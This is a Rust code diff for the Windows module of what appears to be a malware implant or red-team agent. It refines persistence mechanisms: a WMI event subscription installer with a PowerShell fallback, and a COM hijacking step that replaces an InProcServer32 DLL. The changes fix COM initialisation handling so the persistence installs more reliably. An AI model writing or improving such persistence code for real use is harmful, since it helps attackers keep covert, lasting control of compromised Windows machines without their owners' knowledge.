@@ -668,12 +668,27 @@ pub mod windows {
             );
 
             unsafe {
+                const RPC_E_CHANGED_MODE: i32 = 0x8001_0106u32 as i32;
                 let hr = CoInitializeEx(ptr::null_mut(), COINIT_MULTITHREADED);
-                if !SUCCEEDED(hr) && hr != 0x00000001i32 /* S_FALSE */ {
+                // S_OK      — COM initialised successfully; we own it and must
+                //              call CoUninitialize when done.
+                // S_FALSE   — COM already initialised on this thread (same apartment);
+                //              still balanced — call CoUninitialize.
+                // RPC_E_CHANGED_MODE — COM already initialised in a *different* apartment
+                //              model.  We do NOT own the initialisation and must NOT call
+                //              CoUninitialize, or we'll tear down the caller's COM setup.
+                let should_uninitialize = SUCCEEDED(hr);
+                if !should_uninitialize && hr != RPC_E_CHANGED_MODE {
                     return Err(anyhow!(
                         "WmiSubscription::install: CoInitializeEx failed: 0x{:08X}",
                         hr
                     ));
+                }
+                if hr == RPC_E_CHANGED_MODE {
+                    log::debug!(
+                        "WmiSubscription::install: COM already initialised in a different \
+                         apartment (RPC_E_CHANGED_MODE); proceeding without owning COM lifetime"
+                    );
                 }
 
                 let result = wmi_install_com(&self.subscription_name, exe_path.as_ref());
@@ -683,10 +698,14 @@ pub mod windows {
                         e
                     );
                     let ps_result = wmi_install_powershell(&self.subscription_name, exe_path.as_ref());
-                    CoUninitialize();
+                    if should_uninitialize {
+                        CoUninitialize();
+                    }
                     ps_result?;
                 } else {
-                    CoUninitialize();
+                    if should_uninitialize {
+                        CoUninitialize();
+                    }
                 }
 
                 log::info!("WmiSubscription::install: registered successfully");
@@ -912,7 +931,21 @@ pub mod windows {
             }
         }
         if cfg.com_hijacking {
-            if let Err(e) = ComHijacking::default().install(&exe) {
+            // COM hijacking replaces an InProcServer32 DLL, so the agent must be
+            // built as a DLL (e.g. --crate-type cdylib).  When running as an EXE
+            // the file extension check inside ComHijacking::install() would always
+            // reject the path — skip early and log the reason instead of emitting
+            // a misleading "install failed" warning.
+            let is_dll = exe.extension().map_or(false, |ext| {
+                ext.eq_ignore_ascii_case("dll")
+            });
+            if !is_dll {
+                log::info!(
+                    "ComHijacking: skipping — agent binary is '{}' (not a DLL); \
+                     COM hijacking requires a cdylib build target",
+                    exe.display()
+                );
+            } else if let Err(e) = ComHijacking::default().install(&exe) {
                 log::warn!("ComHijacking install failed (non-fatal): {}", e);
             }
         }
